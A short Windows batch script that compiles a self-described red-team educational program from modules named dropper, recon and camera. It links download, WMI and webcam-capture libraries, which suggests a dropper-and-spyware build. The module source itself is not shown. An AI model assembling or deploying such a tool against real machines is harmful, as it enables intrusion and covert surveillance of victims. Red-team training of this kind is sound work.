@echo off
echo Compiling Red Team Educational System (Statically Linked /MT)...

:: Compile with /MT for static C Runtime and explicitly link all required libraries
cl.exe /nologo /MT /O2 /EHsc /Fe"RedSmartSystem.exe" "main.cpp" "..\Task 1\dropper.cpp" "..\Task 2\recon.cpp" "..\Task 3\camera.cpp" urlmon.lib wininet.lib mfplat.lib mfreadwrite.lib mfuuid.lib wbemuuid.lib crypt32.lib advapi32.lib ole32.lib oleaut32.lib user32.lib shell32.lib

if %ERRORLEVEL% EQU 0 (
    echo Build successful. RedSmartSystem.exe created.
) else (
    echo Build failed.
)
pause
